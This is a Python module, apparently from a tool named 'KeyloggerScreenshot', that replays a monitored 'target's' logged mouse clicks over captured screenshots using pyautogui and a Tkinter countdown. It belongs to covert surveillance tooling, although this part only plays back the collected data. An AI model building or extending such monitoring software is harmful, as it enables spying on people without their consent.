import threading
import pyautogui as pg
import sys
import os
import ast
import time
import PIL.Image
import tkinter as tk

def countdown():
    global seconds
    global startbutton
    global tkWindow
    real_sec = seconds
    seconds = seconds + 4
    # Plus four seconds because of the time the code sleeps

    if sys.platform == "linux": size = "295x367"
    else: size = "250x415"

    tkWindow = tk.Tk()
    tkWindow.geometry(size)
    tkWindow.title('KeyloggerScreenshot')
    minutes = seconds // 60
    this_min = minutes * 60
    this_sec = seconds - this_min
    print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")

    while seconds:  # Same like Timer Class
        mins, secs = divmod(seconds, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(f"\rTime left: {timer}", end="")
        time.sleep(1)
        seconds -= 1
    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
    # GUI BY: DYMA020
    startbutton = tk.Button(tkWindow, text="Stop stimulation", command=changecol, height=10, width=30)
    # Puts everything on place
    startbutton.grid(row=1, column=0)
    if real_sec < 60:
        text = f"Simulation for {real_sec} seconds"
    else:
        m, s = divmod(real_sec, 60)
        timer = '{:02d}:{:02d}'.format(m, s)
        text = f"Simulation for {timer} minutes"
    # Just for decoration
    tk.Button(tkWindow, text=text, command=connection, height=10, width=30).grid(row=2, column=0)
    tkWindow.mainloop()


def changecol():  # This function is here to if the simulation has ended
    startbutton.configure(bg="red")
    # This is the button
    startbutton["text"] = "Stop simulation"
    tkWindow.destroy()


def connection():
    print("Successful connection")

def start_simulation():
    global seconds
    mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
    #Looks for coordinates in mouseInfoLog

    if not mouse_coordinates:
        #If there isn't a file called mouseInfoLog it will destroy itself
        print("\nThe target hasn't clicked anything")
        print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
        sys.exit()

    every_coordinate = []
    for each_core in mouse_coordinates:
        fhandle = open(each_core)
        for line in fhandle:
            if "[" in line:
                every_coordinate += ast.literal_eval(line)
                #This makes a list out of a string

    img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
    #This checks for all Images in the directory

    if not img_files:
        print('There is no "New_Image" in this directory')
        sys.exit()

    pg.FAILSAFE = False
    #This is for the corner allowance
    img_seconds = 5.572
    #This is the speed it takes to open the image
    speed = 0.47
    #This is the time each coordinate needs
    sleep = 1.5
    #This is the time where the code is taking a time out
    one_coordinate = speed + sleep

    duration_seconds = one_coordinate * len(every_coordinate)
    one_image = duration_seconds + img_seconds
    summed_up = one_image * len(img_files)
    seconds = round(summed_up)
    #This calculates the amount it will take

    print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
    threading_count = threading.Thread(target=countdown)
    #The countdown will start
    threading_count.start()

    pg.sleep(4)
    for image in img_files:
        im = PIL.Image.open(image)
        #Opens the image
        im.show()
        time.sleep(2)
        pg.press("f11")
        # Makes the image in the perfect resolution
        for x, y in every_coordinate:
            pg.moveTo(x, y, 0.3)
            time.sleep(sleep)
        pg.press("esc")
